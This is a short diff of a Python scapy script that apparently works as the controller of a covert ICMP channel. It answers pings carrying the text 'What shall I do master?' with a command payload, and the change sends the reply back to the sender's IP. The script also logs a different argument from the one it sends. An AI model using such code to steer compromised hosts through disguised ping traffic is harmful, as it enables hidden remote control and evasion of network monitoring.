@@ -34,7 +34,7 @@ def main(argv):
 			print "[*] Request checksum: (%s)" % checksum
 			print "[*] Request: " + request
 			if request == 'What shall I do master?':
-				resp = IP(dst=host,id=ip_id)/ICMP(type="echo-reply",id=icmp_id)/sys.argv[1]
+				resp = IP(dst=p['IP'].src,id=ip_id)/ICMP(type="echo-reply",id=icmp_id)/sys.argv[1]
 				print "[*] Response sent: " + sys.argv[2]
 				resp.show2()
 				send(resp)
